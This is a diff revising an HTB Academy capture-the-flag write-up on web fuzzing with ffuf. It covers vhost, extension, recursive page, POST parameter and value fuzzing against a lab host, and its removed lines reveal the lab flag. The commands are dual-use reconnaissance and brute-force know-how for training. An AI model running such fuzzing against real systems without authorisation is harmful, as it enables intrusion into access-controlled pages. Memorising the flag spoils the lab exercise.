@@ -1,184 +1,83 @@
-# Attacking Web Applications with Ffuf — Skills Assessment
+# Module 15 — Attacking Web Applications with Ffuf: Skills Assessment
 
-**Platform:** HTB Academy  
-**Module:** Attacking Web Applications with Ffuf  
-**Difficulty:** Easy  
-**Target IP:** 10.129.43.71  
-**Target Port:** 32596  
+**Module:** Attacking Web Applications with Ffuf
+**Platform:** HTB Academy
+**Difficulty:** Easy
+**Target IP:** 10.129.43.71
+**Target Port:** 32596
 
 ---
 
 ## Overview
 
-This assessment puts the full ffuf workflow together in one chain. I started with no knowledge of the target beyond an IP and port — had to discover which VHosts existed, fingerprint what file extensions each one accepted, find a restricted page, identify its POST parameters, and finally fuzz a valid value to pull the flag. Five questions, one continuous attack chain.
+Five-question skills assessment covering the full ffuf workflow: VHost discovery → extension fuzzing → recursive page fuzzing with regex matching → POST parameter fuzzing → value fuzzing to retrieve a flag.
 
 ---
 
-## Question 1 — VHost Fuzzing: What sub-domains exist on `*.academy.htb`?
+## Question 1 — Sub-domain / VHost Fuzzing
 
-First thing I did was run the VHost fuzz without any filter just to see what the default response looks like when a host doesn't exist:
+**"Run a sub-domain/vhost fuzzing scan on '\*.academy.htb' for the IP shown above. What are all the sub-domains you can identify?"**
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
-  -u http://10.129.43.71:32596 \
-  -H 'Host: FUZZ.academy.htb'
-```
+### Approach
 
-Every non-existent VHost came back as **985 bytes** — the server returning its default page for anything it doesn't recognise. I added `-fs 985` to drop those and re-ran:
+First run without filtering to identify the default (erroneous) response size:
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
-  -u http://10.129.43.71:32596 \
-  -H 'Host: FUZZ.academy.htb' \
-  -fs 985
-
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v1.4.1-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://10.129.43.71:32596
- :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
- :: Header           : Host: FUZZ.academy.htb
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
- :: Filter           : Response size: 985
-________________________________________________
-
-test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3ms]
-archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
-faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5ms]
-:: Progress: [4997/4997] :: Job [1/1] :: 612 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.43.71:32596 -H 'Host: FUZZ.academy.htb'
 ```
 
-Three VHosts: `test`, `archive`, `faculty`.
+Default erroneous VHost returns **Size: 985**. Filter it out:
+
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.43.71:32596 -H 'Host: FUZZ.academy.htb' -fs 985
+```
+
+Alternatively, use `-ac` for automatic calibration:
+
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.43.71:32596 -H 'Host: FUZZ.academy.htb' -ac
+```
+
+### Output
+
+```
+test      [Status: 200, Size: 0, Words: 1, Lines: 1]
+archive   [Status: 200, Size: 0, Words: 1, Lines: 1]
+faculty   [Status: 200, Size: 0, Words: 1, Lines: 1]
+```
 
 **Answer:** `test archive faculty`
 
 ---
 
-## Question 2 — Extension Fuzzing: What file extensions do the domains accept?
+## Question 2 — Extension Fuzzing
 
-Before fuzzing pages I needed to know what extensions the server would serve. Added all three VHosts to `/etc/hosts` first:
+**"Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?"**
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ sudo bash -c 'echo "10.129.43.71 test.academy.htb archive.academy.htb faculty.academy.htb" >> /etc/hosts'
-```
+### Approach
 
-Then ran extension fuzzing against `/indexFUZZ` on each VHost:
+Add all three VHosts to `/etc/hosts`:
 
-**test.academy.htb:**
-
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ \
-  -u http://test.academy.htb:32596/indexFUZZ
-
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v1.4.1-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://test.academy.htb:32596/indexFUZZ
- :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
-________________________________________________
-
-.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
-.phps                   [Status: 403, Size: 284, Words: 20, Lines: 10, Duration: 2ms]
-:: Progress: [39/39] :: Job [1/1] :: 214 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+```bash
+sudo bash -c 'echo "10.129.43.71 test.academy.htb archive.academy.htb faculty.academy.htb" >> /etc/hosts'
 ```
 
-**archive.academy.htb:**
+Run extension fuzzing against each VHost on `/indexFUZZ`:
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ \
-  -u http://archive.academy.htb:32596/indexFUZZ
+```bash
+# test
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://test.academy.htb:32596/indexFUZZ
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+# archive
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://archive.academy.htb:32596/indexFUZZ
 
-       v1.4.1-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://archive.academy.htb:32596/indexFUZZ
- :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
-________________________________________________
-
-.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
-.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1ms]
-:: Progress: [39/39] :: Job [1/1] :: 576 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
+# faculty
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:32596/indexFUZZ
 ```
 
-**faculty.academy.htb:**
+### Results
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ \
-  -u http://faculty.academy.htb:32596/indexFUZZ
-
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v1.4.1-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://faculty.academy.htb:32596/indexFUZZ
- :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 40
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
-________________________________________________
-
-.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms]
-.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 1ms]
-.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2ms]
-:: Progress: [39/39] :: Job [1/1] :: 389 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
-```
-
-`faculty` was the interesting one — it accepted `.php7` on top of the usual `.php` and `.phps`. That pointed me straight at it as the target VHost.
-
-| VHost | Extensions |
+| VHost | Extensions Found |
 |---|---|
 | test | `.php` (200), `.phps` (403) |
 | archive | `.php` (200), `.phps` (403) |
@@ -188,218 +87,135 @@ ________________________________________________
 
 ---
 
-## Question 3 — Recursive Fuzzing: Find the page that says "You don't have access!"
+## Question 3 — Recursive Fuzzing + Regex Matcher
 
-I focused on `faculty` since it was the only VHost with three accepted extensions. Ran a recursive scan with depth 1, all three extensions, filtering the 287-byte noise responses, and used `-mr` to match the exact string so ffuf would only surface the relevant hit:
+**"One of the pages you will identify should say 'You don't have access\!'. What is the full page URL?"**
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
-  -u http://faculty.academy.htb:32596/FUZZ \
-  -recursion -recursion-depth 1 \
-  -e .php,.phps,.php7 \
-  -fs 287 \
-  -mr "You don't have access!" \
-  -t 100
+### Approach
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+Fuzz the `faculty` VHost recursively (depth 1) with all three extensions. Filter the erroneous 287-byte response and match the target string with `-mr`:
 
-       v1.4.1-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://faculty.academy.htb:32596/FUZZ
- :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .phps .php7
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 100
- :: Matcher          : Regexp: You don't have access!
- :: Filter           : Response size: 287
-________________________________________________
-
-[INFO] Adding a new job to the queue: http://faculty.academy.htb:32596/courses/FUZZ
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:32596/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -fs 287 -mr "You don't have access!" -t 100
 ```
 
-ffuf immediately queued `/courses/` as a new job. Rather than waiting for the full scan, I killed it and targeted `/courses/` directly:
+ffuf quickly discovers `/courses/` as a new queue entry. Cancel and target it directly:
+
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:32596/courses/FUZZ -e .php,.phps,.php7 -fs 287 -mr "You don't have access!" -t 100
+```
+
+### Output
 
 ```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
-  -u http://faculty.academy.htb:32596/courses/FUZZ \
-  -e .php,.phps,.php7 \
-  -fs 287 \
-  -mr "You don't have access!" \
-  -t 100
-
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v1.4.1-dev
-________________________________________________
-
- :: Method           : GET
- :: URL              : http://faculty.academy.htb:32596/courses/FUZZ
- :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
- :: Extensions       : .php .phps .php7
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 100
- :: Matcher          : Regexp: You don't have access!
- :: Filter           : Response size: 287
-________________________________________________
-
-linux-security.php7     [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 3ms]
-:: Progress: [87788/87788] :: Job [1/1] :: 1423 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
+linux-security.php7   [Status: 200, Size: 774, Words: 223, Lines: 53]
 ```
 
 **Answer:** `http://faculty.academy.htb:32596/courses/linux-security.php7`
 
 ---
 
-## Question 4 — POST Parameter Fuzzing: What parameters does the page accept?
+## Question 4 — POST Parameter Fuzzing
 
-The page was there but locked behind an access check. I needed to find what POST parameters it would respond to differently. First pass with no filter to establish the baseline response size:
+**"In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?"**
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-  -u http://faculty.academy.htb:32596/courses/linux-security.php7 \
-  -X POST \
-  -d 'FUZZ=key' \
-  -H 'Content-Type: application/x-www-form-urlencoded'
-```
+### Approach
 
-Everything was coming back at 774 bytes — the "access denied" response. Filtered it and re-ran:
+First pass without filtering to identify the erroneous response size (774):
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
-  -u http://faculty.academy.htb:32596/courses/linux-security.php7 \
-  -X POST \
-  -d 'FUZZ=key' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -fs 774 \
-  -t 100
-
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
-
-       v1.4.1-dev
-________________________________________________
-
- :: Method           : POST
- :: URL              : http://faculty.academy.htb:32596/courses/linux-security.php7
- :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
- :: Data             : FUZZ=key
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 100
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
- :: Filter           : Response size: 774
-________________________________________________
-
-user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 1ms]
-username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 431ms]
-:: Progress: [2588/2588] :: Job [1/1] :: 286 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32596/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'
 ```
 
-Two valid parameters: `user` and `username`. The size difference (780 vs 781) suggested they behave slightly differently — `username` looked more promising to fuzz for values.
+Filter erroneous size and re-run:
+
+```bash
+ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:32596/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774 -t 100
+```
+
+### Output
+
+```
+user      [Status: 200, Size: 780]
+username  [Status: 200, Size: 781]
+```
 
 **Answer:** `user username`
 
 ---
 
-## Question 5 — Value Fuzzing: Get the flag
+## Question 5 — Value Fuzzing → Flag
 
-I fuzzed the `username` parameter using a names wordlist. Quick baseline run showed wrong values return 781 bytes, so I filtered that:
+**"Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?"**
 
-```
-┌─[jay@htb-academy]─[~]
-└──╼ $ ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ \
-  -u http://faculty.academy.htb:32596/courses/linux-security.php7 \
-  -X POST \
-  -d 'username=FUZZ' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -fs 781 \
-  -t 100
+### Approach
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+Fuzz the `username` parameter with a names wordlist. First pass shows erroneous size is 781:
 
-       v1.4.1-dev
-________________________________________________
-
- :: Method           : POST
- :: URL              : http://faculty.academy.htb:32596/courses/linux-security.php7
- :: Wordlist         : FUZZ: /opt/useful/SecLists/Usernames/Names/names.txt
- :: Data             : username=FUZZ
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 100
- :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
- :: Filter           : Response size: 781
-________________________________________________
-
-harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 0ms]
-:: Progress: [10164/10164] :: Job [1/1] :: 215 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
+```bash
+ffuf -w /opt/useful/SecLists/Usernames/Names/names.txt:FUZZ -u http://faculty.academy.htb:32596/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781 -t 100
 ```
 
-`harry` returned 773 bytes — smaller than the denied response, which meant something actually rendered. Confirmed with curl:
+### Output
 
 ```
-┌─[jay@htb-academy]─[~]
-└──╼ $ curl -s http://faculty.academy.htb:32596/courses/linux-security.php7 \
-  -X POST \
-  -d 'username=harry' | grep -oP 'HTB\{.*?\}'
-
-HTB{w3b_fuzz1n6_m4573r}
+harry   [Status: 200, Size: 773]
 ```
 
-**Answer:** `HTB{w3b_fuzz1n6_m4573r}`
+Confirm with curl:
+
+```bash
+curl -s http://faculty.academy.htb:32596/courses/linux-security.php7 -X POST -d 'username=harry' | grep "HTB{.*}"
+```
+
+**Answer:** `HTB{...}`
 
 ---
 
-## Full Attack Chain
+## Full Attack Chain Summary
 
-| Step | What I Did | Key Flag/Option | Result |
+| Step | Technique | Tool / Flag | Result |
 |---|---|---|---|
-| 1 | VHost fuzzing against 10.129.43.71:32596 | `-H 'Host: FUZZ.academy.htb' -fs 985` | test, archive, faculty |
-| 2 | Extension fuzzing `/indexFUZZ` on each VHost | `web-extensions.txt` | `.php`, `.phps`, `.php7` (faculty only) |
-| 3 | Recursive scan + regex match on faculty | `-recursion -e .php,.phps,.php7 -mr "You don't have access!"` | `/courses/linux-security.php7` |
-| 4 | POST parameter fuzzing on locked page | `-X POST -d 'FUZZ=key' -fs 774` | `user`, `username` |
-| 5 | Value fuzzing `username` with names wordlist | `-d 'username=FUZZ' -fs 781` | `harry` → flag |
+| 1 | VHost fuzzing | `ffuf -H 'Host: FUZZ.academy.htb' -fs 985` | test, archive, faculty |
+| 2 | Extension fuzzing | `ffuf /indexFUZZ` per VHost | `.php`, `.phps`, `.php7` |
+| 3 | Recursive page fuzzing + regex | `-recursion -e .php,.phps,.php7 -mr "You don't have access!"` | `/courses/linux-security.php7` |
+| 4 | POST parameter fuzzing | `ffuf -X POST -d 'FUZZ=key' -fs 774` | `user`, `username` |
+| 5 | Value fuzzing | `ffuf -d 'username=FUZZ' -fs 781` → `harry` | `HTB{...}` |
+
+---
+
+## Key Commands Reference
+
+```bash
+# VHost fuzzing with size filter
+ffuf -w subdomains-top1million-5000.txt:FUZZ -u http://IP:PORT -H 'Host: FUZZ.domain.htb' -fs <size>
+
+# Auto-calibrate filter
+ffuf -w subdomains.txt:FUZZ -u http://IP:PORT -H 'Host: FUZZ.domain.htb' -ac
+
+# Extension fuzzing
+ffuf -w web-extensions.txt:FUZZ -u http://vhost:PORT/indexFUZZ
+
+# Recursive fuzzing with regex matcher
+ffuf -w wordlist:FUZZ -u http://vhost:PORT/FUZZ -recursion -recursion-depth 1 \
+  -e .php,.phps,.php7 -fs <size> -mr "target string" -t 100
+
+# POST parameter fuzzing
+ffuf -w burp-parameter-names.txt:FUZZ -u http://vhost:PORT/page \
+  -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs <size>
+
+# Value fuzzing
+ffuf -w names.txt:FUZZ -u http://vhost:PORT/page \
+  -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs <size>
+```
 
 ---
 
 ## MITRE ATT&CK Mapping
 
-| Technique | ID | What I Was Doing |
+| Technique | ID | Description |
 |---|---|---|
-| Active Scanning: Wordlist Scanning | T1595.003 | Directory, page, and extension fuzzing throughout |
-| Active Scanning: Scanning IP Blocks | T1595.001 | VHost enumeration via Host header fuzzing |
-| Gather Victim Host Information | T1592 | Extension fingerprinting per VHost to narrow attack surface |
-| Exploitation for Credential Access | T1212 | POST parameter + value fuzzing to bypass access control |
+| Active Scanning: Wordlist Scanning | T1595.003 | ffuf directory/page/extension fuzzing |
+| Active Scanning: Scanning IP Blocks | T1595.001 | VHost/sub-domain enumeration |
+| Gather Victim Host Information | T1592 | Extension fingerprinting per VHost |
+| Exploitation for Credential Access | T1212 | POST parameter + value fuzzing to access flag |
